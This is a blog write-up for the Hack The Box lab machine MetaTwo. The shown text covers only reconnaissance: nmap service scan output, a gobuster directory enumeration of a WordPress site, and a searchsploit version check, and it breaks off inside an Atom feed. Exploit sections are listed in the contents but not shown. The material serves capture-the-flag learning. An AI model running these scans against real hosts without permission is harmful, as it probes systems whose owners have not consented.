<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Writeup: MetaTwo | woadey</title><meta name=keywords content="htb,hackthebox,MetaTwo,writeup"><meta name=description content="Writeup for Hack The Box – MetaTwo"><meta name=author content><link rel=canonical href=https://woadey.lol/posts/htb/easy/metatwo/><link crossorigin=anonymous href=/assets/css/stylesheet.773ff64224d5fdb98d19a76ced28954c41dd17e4cf78248959777136da478414.css integrity="sha256-dz/2QiTV/bmNGads7SiVTEHdF+TPeCSJWXdxNtpHhBQ=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.lol/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.lol/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.lol/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.lol/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.lol/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://woadey.lol/posts/htb/easy/metatwo/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR")}</script><meta property="og:url" content="https://woadey.lol/posts/htb/easy/metatwo/"><meta property="og:site_name" content="woadey"><meta property="og:title" content="HTB Writeup: MetaTwo"><meta property="og:description" content="Writeup for Hack The Box – MetaTwo"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-02T16:50:39-04:00"><meta property="article:modified_time" content="2023-04-02T16:50:39-04:00"><meta property="article:tag" content="Ftp"><meta property="article:tag" content="Sql"><meta property="og:image" content="https://woadey.lol/images/MetaTwo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://woadey.lol/images/MetaTwo.png"><meta name=twitter:title content="HTB Writeup: MetaTwo"><meta name=twitter:description content="Writeup for Hack The Box – MetaTwo"><meta name=twitter:site content="@woadey_"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.lol/posts/"},{"@type":"ListItem","position":2,"name":"HTB Writeup: MetaTwo","item":"https://woadey.lol/posts/htb/easy/metatwo/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Writeup: MetaTwo","name":"HTB Writeup: MetaTwo","description":"Writeup for Hack The Box – MetaTwo","keywords":["htb","hackthebox","MetaTwo","writeup"],"articleBody":"nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.92 scan initiated Sun Apr 2 17:01:38 2023 as: nmap -sC -sV -oA nmap/metatwo -T4 10.10.11.186 Nmap scan report for 10.10.11.186 Host is up (0.012s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA) | 256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA) |_ 256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://metapress.htb/ |_http-server-header: nginx/1.18.0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.92%I=7%D=4/2%Time=6429ED3E%P=x86_64-pc-linux-gnu%r(Gener SF:icLines,8F,\"220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\\. SF:11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20crea SF:tive\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creative\\ SF:r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Apr 2 17:02:46 2023 -- 1 IP address (1 host up) scanned in 68.09 seconds gobuster 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ┌──(kali㉿kali)-[~/htb/metatwo] └─$ gobuster dir -u http://metapress.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o dir.out -z =============================================================== Gobuster v3.2.0-dev by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://metapress.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.2.0-dev [+] Timeout: 10s =============================================================== 2023/04/02 17:06:29 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 302) [Size: 0] [--\u003e http://metapress.htb/wp-admin/] /login (Status: 302) [Size: 0] [--\u003e http://metapress.htb/wp-login.php] /s (Status: 301) [Size: 0] [--\u003e http://metapress.htb/sample-page/] /a (Status: 301) [Size: 0] [--\u003e http://metapress.htb/about-us/] /t (Status: 301) [Size: 0] [--\u003e http://metapress.htb/thank-you/] /rss (Status: 301) [Size: 0] [--\u003e http://metapress.htb/feed/] /ca (Status: 301) [Size: 0] [--\u003e http://metapress.htb/cancel-appointment/] /events (Status: 301) [Size: 0] [--\u003e http://metapress.htb/events/] /e (Status: 301) [Size: 0] [--\u003e http://metapress.htb/events/] /event (Status: 301) [Size: 0] [--\u003e http://metapress.htb/events/] /c (Status: 301) [Size: 0] [--\u003e http://metapress.htb/cancel-appointment/] /dashboard (Status: 302) [Size: 0] [--\u003e http://metapress.htb/wp-admin/] /sa (Status: 301) [Size: 0] [--\u003e http://metapress.htb/sample-page/] /sam (Status: 301) [Size: 0] [--\u003e http://metapress.htb/sample-page/] /about (Status: 301) [Size: 0] [--\u003e http://metapress.htb/about-us/] /feed (Status: 301) [Size: 0] [--\u003e http://metapress.htb/feed/] /h (Status: 301) [Size: 0] [--\u003e http://metapress.htb/hello-world/] /th (Status: 301) [Size: 0] [--\u003e http://metapress.htb/thank-you/] /sample (Status: 301) [Size: 0] [--\u003e http://metapress.htb/sample-page/] /ab (Status: 301) [Size: 0] [--\u003e http://metapress.htb/about-us/] /atom (Status: 301) [Size: 0] [--\u003e http://metapress.htb/feed/atom/] /abo (Status: 301) [Size: 0] [--\u003e http://metapress.htb/about-us/] /eve (Status: 301) [Size: 0] [--\u003e http://metapress.htb/events/] /hello (Status: 301) [Size: 0] [--\u003e http://metapress.htb/hello-world/] /ev (Status: 301) [Size: 0] [--\u003e http://metapress.htb/events/] /can (Status: 301) [Size: 0] [--\u003e http://metapress.htb/cancel-appointment/] /samp (Status: 301) [Size: 0] [--\u003e http://metapress.htb/sample-page/] /he (Status: 301) [Size: 0] [--\u003e http://metapress.htb/hello-world/] =============================================================== 2023/04/02 17:09:29 Finished =============================================================== searchsploit Wappalyzer gave me this list which I searched in searchploit:\nWordpress 5.6.2 Moment.js 2.29.1 Vue.js 2.6.12 Axios core-js 2.6.11 jQuery 3.5.1 jQuery Migrate 3.3.2 Underscore.js 1.8.3 None of these proved useful.\natom Found this weird file from /atom:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e","wordCount":"1766","inLanguage":"en","image":"https://woadey.lol/images/MetaTwo.png","datePublished":"2023-04-02T16:50:39-04:00","dateModified":"2023-04-02T16:50:39-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.lol/posts/htb/easy/metatwo/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.lol/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.lol/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu_c928aba3db890e7e.webp 32w, /images/pink_hu_c262b7944553d845.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.lol/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.lol/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.lol/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.lol/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.lol/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.lol/>home</a>&nbsp;»&nbsp;<a href=https://woadey.lol/posts/>posts</a></div><h1 class="post-title entry-hint-parent">HTB Writeup: MetaTwo</h1><div class=post-description>Writeup for Hack The Box – MetaTwo</div><div class=post-meta><span title='2023-04-02 16:50:39 -0400 -0400'>April 2, 2023</span>&nbsp;·&nbsp;9 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#nmap>nmap</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#searchsploit>searchsploit</a></li><li><a href=#atom>atom</a></li><li><a href=#burpsuite>burpsuite</a></li><li><a href=#cve-2022-0739>CVE-2022-0739</a></li><li><a href=#john-the-ripper>john the ripper</a></li><li><a href=#cve-2021-29447>CVE-2021-29447</a></li><li><a href=#ftp>ftp</a></li><li><a href=#ssh>ssh</a></li><li><a href=#privesc>privesc</a></li><li><a href=#flags>Flags</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Sun Apr  2 17:01:38 2023 as: nmap -sC -sV -oA nmap/metatwo -T4 10.10.11.186</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.186
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.012s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp open  ftp
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines:
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=m>220</span> ProFTPD Server <span class=o>(</span>Debian<span class=o>)</span> <span class=o>[</span>::ffff:10.10.11.186<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid command: try being more creative
</span></span><span class=line><span class=cl><span class=p>|</span>_    Invalid command: try being more creative
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.18.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://metapress.htb/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port21-TCP:V<span class=o>=</span>7.92%I<span class=o>=</span>7%D<span class=o>=</span>4/2%Time<span class=o>=</span>6429ED3E%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Gener
</span></span><span class=line><span class=cl>SF:icLines,8F,<span class=s2>&#34;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.
</span></span></span><span class=line><span class=cl><span class=s2>SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
</span></span></span><span class=line><span class=cl><span class=s2>SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
</span></span></span><span class=line><span class=cl><span class=s2>SF:r\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sun Apr  2 17:02:46 2023 -- 1 IP address (1 host up) scanned in 68.09 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=gobuster>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/metatwo<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ gobuster dir -u http://metapress.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o dir.out -z
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.2.0-dev
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://metapress.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/02 17:06:29 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/wp-admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/login                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/wp-login.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/s                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/sample-page/<span class=o>]</span>
</span></span><span class=line><span class=cl>/a                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/about-us/<span class=o>]</span>
</span></span><span class=line><span class=cl>/t                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/thank-you/<span class=o>]</span>
</span></span><span class=line><span class=cl>/rss                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/feed/<span class=o>]</span>
</span></span><span class=line><span class=cl>/ca                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/cancel-appointment/<span class=o>]</span>
</span></span><span class=line><span class=cl>/events               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/events/<span class=o>]</span>
</span></span><span class=line><span class=cl>/e                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/events/<span class=o>]</span>
</span></span><span class=line><span class=cl>/event                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/events/<span class=o>]</span>
</span></span><span class=line><span class=cl>/c                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/cancel-appointment/<span class=o>]</span>
</span></span><span class=line><span class=cl>/dashboard            <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/wp-admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/sa                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/sample-page/<span class=o>]</span>
</span></span><span class=line><span class=cl>/sam                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/sample-page/<span class=o>]</span>
</span></span><span class=line><span class=cl>/about                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/about-us/<span class=o>]</span>
</span></span><span class=line><span class=cl>/feed                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/feed/<span class=o>]</span>
</span></span><span class=line><span class=cl>/h                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/hello-world/<span class=o>]</span>
</span></span><span class=line><span class=cl>/th                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/thank-you/<span class=o>]</span>
</span></span><span class=line><span class=cl>/sample               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/sample-page/<span class=o>]</span>
</span></span><span class=line><span class=cl>/ab                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/about-us/<span class=o>]</span>
</span></span><span class=line><span class=cl>/atom                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/feed/atom/<span class=o>]</span>
</span></span><span class=line><span class=cl>/abo                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/about-us/<span class=o>]</span>
</span></span><span class=line><span class=cl>/eve                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/events/<span class=o>]</span>
</span></span><span class=line><span class=cl>/hello                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/hello-world/<span class=o>]</span>
</span></span><span class=line><span class=cl>/ev                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/events/<span class=o>]</span>
</span></span><span class=line><span class=cl>/can                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/cancel-appointment/<span class=o>]</span>
</span></span><span class=line><span class=cl>/samp                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/sample-page/<span class=o>]</span>
</span></span><span class=line><span class=cl>/he                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://metapress.htb/hello-world/<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/02 17:09:29 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=searchsploit>searchsploit<a hidden class=anchor aria-hidden=true href=#searchsploit>#</a></h3><p>Wappalyzer gave me this list which I searched in <code>searchploit</code>:</p><ul><li>Wordpress 5.6.2</li><li>Moment.js 2.29.1</li><li>Vue.js 2.6.12</li><li>Axios</li><li>core-js 2.6.11</li><li>jQuery 3.5.1</li><li>jQuery Migrate 3.3.2</li><li>Underscore.js 1.8.3</li></ul><p>None of these proved useful.</p><h3 id=atom>atom<a hidden class=anchor aria-hidden=true href=#atom>#</a></h3><p>Found this weird file from <code>/atom</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span><span class=nt>&lt;feed</span>
</span></span><span class=line><span class=cl>        <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2005/Atom&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>xmlns:thr=</span><span class=s>&#34;http://purl.org/syndication/thread/1.0&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>xml:lang=</span><span class=s>&#34;en-US&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>xml:base=</span><span class=s>&#34;http://metapress.htb/wp-atom.php&#34;</span>
</span></span><span class=line><span class=cl>        <span class=err>&lt;title</span> <span class=na>type=</span><span class=s>&#34;text&#34;</span><span class=nt>&gt;</span>MetaPress<span class=nt>&lt;/title&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;subtitle</span> <span class=na>type=</span><span class=s>&#34;text&#34;</span><span class=nt>&gt;</span>Official company site<span class=nt>&lt;/subtitle&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;updated&gt;</span>2022-06-23T18:05:43Z<span class=nt>&lt;/updated&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;link</span> <span class=na>rel=</span><span class=s>&#34;alternate&#34;</span> <span class=na>type=</span><span class=s>&#34;text/html&#34;</span> <span class=na>href=</span><span class=s>&#34;http://metapress.htb&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;id&gt;</span>http://metapress.htb/feed/atom/<span class=nt>&lt;/id&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;link</span> <span class=na>rel=</span><span class=s>&#34;self&#34;</span> <span class=na>type=</span><span class=s>&#34;application/atom+xml&#34;</span> <span class=na>href=</span><span class=s>&#34;http://metapress.htb/feed/atom/&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;generator</span> <span class=na>uri=</span><span class=s>&#34;https://wordpress.org/&#34;</span> <span class=na>version=</span><span class=s>&#34;5.6.2&#34;</span><span class=nt>&gt;</span>WordPress<span class=nt>&lt;/generator&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;entry&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;author&gt;</span>
</span></span><span class=line><span class=cl>                        <span class=nt>&lt;name&gt;</span>admin<span class=nt>&lt;/name&gt;</span>
</span></span><span class=line><span class=cl>                                                        <span class=nt>&lt;uri&gt;</span>http://metapress.htb<span class=nt>&lt;/uri&gt;</span>
</span></span><span class=line><span class=cl>                                                <span class=nt>&lt;/author&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;title</span> <span class=na>type=</span><span class=s>&#34;html&#34;</span><span class=nt>&gt;</span><span class=cp>&lt;![CDATA[Welcome on board!]]&gt;</span><span class=nt>&lt;/title&gt;</span>
